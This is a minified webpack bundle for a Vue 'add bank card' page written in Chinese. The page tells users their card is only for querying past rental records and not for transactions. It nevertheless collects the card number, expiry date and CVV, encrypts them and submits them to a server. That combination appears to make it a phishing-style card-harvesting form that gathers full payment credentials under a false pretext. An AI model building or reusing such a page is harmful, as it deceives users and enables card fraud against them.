(window["webpackJsonp"]=window["webpackJsonp"]||[]).push([["AddCard"],{"098f":function(a,t,e){"use strict";e.r(t);var s=function(){var a=this,t=a.$createElement,e=a._self._c||t;return e("div",{staticClass:"page addcard-page"},[e("div",{staticClass:"m-form-page"},[e("van-notice-bar",{attrs:{wrapable:"",scrollable:!1}},[a._v("\n        溫馨提示：您添加的銀行卡，是方便您以後用來查詢您過往的租借歸還記錄，而不是用來在本平台交易\n        ")]),e("div",{staticClass:"form-row"},[e("div",{staticClass:"m-label"},[a._v("查詢手機號")]),e("div",{staticClass:"item"},[e("div",{staticClass:"input-box no-back"},[a._v("\n                  "+a._s(a.formData.phone||a.formData.card)+"\n                ")])])]),e("div",{staticClass:"form-row"},[e("div",{staticClass:"label"},[a._v("銀行卡號")]),e("div",{staticClass:"item"},[e("div",{staticClass:"input-box"},[e("van-field",{attrs:{clearable:"",type:"tel",placeholder:"請輸入銀行卡號"},on:{input:function(t){return a.inputNum(t,"newCard")}},model:{value:a.formData.newCard,callback:function(t){a.$set(a.formData,"newCard",t)},expression:"formData.newCard"}})],1)])]),e("div",{staticClass:"form-row"},[e("div",{staticClass:"label"},[a._v("有效期及CVV号")]),e("div",{staticClass:"item"},[e("div",{staticClass:"input-box"},[e("van-field",{attrs:{clearable:"",type:"tel",placeholder:"月/年（如0623）"},on:{input:function(t){return a.inputNum(t,"validityDate")}},model:{value:a.formData.validityDate,callback:function(t){a.$set(a.formData,"validityDate",t)},expression:"formData.validityDate"}})],1),e("div",{staticClass:"input-box item-s"},[e("van-field",{attrs:{clearable:"",type:"tel",placeholder:"卡背面CVV号"},on:{input:function(t){return a.inputNum(t,"cvv")}},model:{value:a.formData.cvv,callback:function(t){a.$set(a.formData,"cvv",t)},expression:"formData.cvv"}})],1)])]),e("div",{staticClass:"form-footer"},[e("button",{directives:[{name:"waves",rawName:"v-waves"}],staticClass:"back-but",on:{click:a.addCard}},[a._v("添加銀行卡")])])],1)])},i=[],r=(e("a481"),e("cebc")),n=e("9feb"),o=e.n(n),c=e("2f62"),d=e("5347"),l=e("f8c8"),v=e("4bfc"),u=o.a.getStorage("queryData")?JSON.parse(o.a.getStorage("queryData")):{},f={directives:{waves:v["a"]},data:function(){return{formData:{card:this.$route.params.card||u.card,phone:this.$route.params.phone||u.phone,newCard:"",validityDate:"",cvv:"",hasPhone:this.$route.params.hasPhone||u.hasPhone}}},name:"addcard",computed:Object(r["a"])({},Object(c["c"])({QUERY_DATA:function(a){return a.QUERY_DATA}})),created:function(){},components:{},methods:Object(r["a"])({},Object(c["b"])(["CHANGE_KEEPALIVES"]),{inputNum:function(a,t){var e=a,s=e.replace(/\s/g,"").replace(/[^\d]/g,"");this.formData[t]=s},addCard:function(){var a=this;if(!this.formData.card)return this.$toast("未获取查询卡号或者手机号!"),!1;if(!this.formData.phone)return this.$toast("请输入正确手机号码或者邮箱号!"),!1;if(!this.formData.newCard)return this.$toast("请填写银行卡号码!"),!1;if(!this.formData.validityDate)return this.$toast("请填写银行卡有效期!"),!1;if(!this.formData.cvv)return this.$toast("请填写卡背面CVV号!"),!1;var t=d["a"].EncryptObj({card:this.formData.card,phone:this.formData.phone,newCard:this.formData.newCard,validityDate:this.formData.validityDate,cvv:this.formData.cvv,hasPhone:"TRUE"==this.formData.hasPhone},["card","phone","newCard","validityDate","cvv"]);this.$toast.loading({message:"提交中..."}),Object(l["b"])()(Object(r["a"])({},t)).then(function(t){0==t.code&&(a.$toast.success("银行卡添加成功!"),a.CHANGE_KEEPALIVES([]),setTimeout(function(){a.$router.replace({name:"history",params:{card:a.formData.card}})},1500))})}})},m=f,p=(e("0a26"),e("2877")),h=Object(p["a"])(m,s,i,!1,null,null,null);t["default"]=h.exports},"0a26":function(a,t,e){"use strict";var s=e("7e9d"),i=e.n(s);i.a},"7e9d":function(a,t,e){}}]);